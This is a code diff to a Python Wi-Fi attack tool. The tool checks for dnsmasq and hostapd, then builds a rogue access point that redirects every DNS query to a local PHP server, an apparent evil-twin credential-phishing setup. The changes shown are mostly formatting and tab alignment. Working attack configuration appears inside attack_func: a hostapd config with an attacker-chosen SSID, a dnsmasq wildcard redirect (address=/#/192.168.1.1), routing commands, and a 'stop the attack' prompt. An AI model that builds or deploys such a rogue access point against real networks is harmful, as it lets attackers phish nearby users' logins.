@@ -189,9 +189,9 @@ def check_deps():
     # Check for dnsmasq
     check_dnsmasq = subprocess.run(["which", "dnsmasq"], capture_output=True, text=True)
     if "dnsmasq" in check_dnsmasq.stdout:
-        get_colours(f"\nDnsmasq\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours(f"\nDnsmasq\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
-        get_colours(f"\nDnsmasq \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours(f"\nDnsmasq\t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
         get_colours("\nInstalling [Dnsmasq]....", "cyan")
         install_dnsmasq = subprocess.run(["sudo", "apt", "install", "dnsmasq", "-y"], capture_output=True,
                                             text=True)
@@ -206,9 +206,9 @@ def check_deps():
     # Check for hostapd
     check_hostapd = subprocess.run(["which", "hostapd"], capture_output=True, text=True)
     if "hostapd" in check_hostapd.stdout:
-        get_colours(f"\nHostapd\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours(f"\nHostapd\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
-        get_colours(f"\nHostapd \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours(f"\nHostapd\t\t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
         get_colours("\nInstalling [Hostapd]....", "cyan")
         install_hostapd= subprocess.run(["sudo", "apt", "install", "hostapd", "-y"], capture_output=True,
                                          text=True)
@@ -401,37 +401,22 @@ def attack_func(network_interface, attack_mode):
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel number: ")
         print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Configuring files...'}")
-        set_hostapd = f"""
-        interface={network_interface}mon
-        driver=nl80211
-        ssid={access_name}
-        hw_mode=g
-        channel={access_channel}
-        macaddr_acl=0
-        ignore_broadcast_ssid=0
+        set_hostapd = f"""interface={network_interface}mon\ndriver=nl80211\nssid={access_name}\nhw_mode=g\nchannel={access_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0
         """
         set_dnsmasq = f""" 
-        interface={network_interface}mon
-        dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
-        dhcp-option=3, 192.168.1.1
-        dhcp-option=6, 192.168.1.1
-        server=8.8.8.8
-        log-queries
-        log-dhcp
-        listen-address=127.0.0.1
-        address=/#/192.168.1.1
-        """
+        interface={network_interface}mon\ndhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h\ndhcp-option=3, 192.168.1.1\ndhcp-option=6, 192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1
+        \naddress=/#/192.168.1.1 """
         # Saving HOSTAPD config
         hostapd_config = open("wifi_hostapd.conf", "w+")
-        hostapd_config.write(set_hostapd)
+        hostapd_config.write(set_hostapd.strip())
         hostapd_config.close()
 
         # Saving DNSMASQ config
         dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
-        dnsmasq_config.write(set_dnsmasq)
+        dnsmasq_config.write(set_dnsmasq.strip())
         dnsmasq_config.close()
         # Adding routes
-        print(f"{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
+        print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + 'Adding routes for the access point...'}")
         subprocess.run([f"ifconfig {network_interface}mon up 192.168.1.1 netmask 255.255.255.0"], shell=True)
         subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
         # get PWD
@@ -449,7 +434,7 @@ def attack_func(network_interface, attack_mode):
         time.sleep(3)
         print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' [!] Press CTRL+C to stop the attack.'}")
         os.system(f"xterm -hold -e sudo php -S 192.168.1.1:80")
-        # Kill all the process.
+        # Killing all the process.
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
         for line in out.splitlines():
